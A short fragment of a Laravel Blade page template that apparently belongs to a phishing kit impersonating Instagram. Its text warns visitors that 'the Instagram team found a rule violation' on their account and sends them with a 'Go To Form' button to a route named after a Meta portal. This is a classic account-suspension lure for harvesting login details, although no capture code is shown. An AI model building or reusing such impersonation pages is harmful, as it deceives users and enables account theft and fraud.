...
@endsection
@section('content')
    <div class="container container-custom d-flex flex-column justify-content-between align-items-center" style="bg-light">
        <div class="d-flex flex-column justify-content-center align-items-center w-100" style="gap:15px">
            ...
            <p style="max-width:550px; line-height:1.5;" class="text-center">If you were redirected to this page, the Instagram team found a rule violation on your account. This may be due to complaints from your business or blog account.</p>
            <a href="{{route('index.meta.portal')}}" class="w-100"><div class="rounded-pill enter-form w-100" style="background-color: #000000; padding: 16px 3px; cursor: pointer;">
                ...
                <p style="margin: 0" class="text-center">Go To Form</p>
            </div></a>
        </div>
    </div>
@endsection
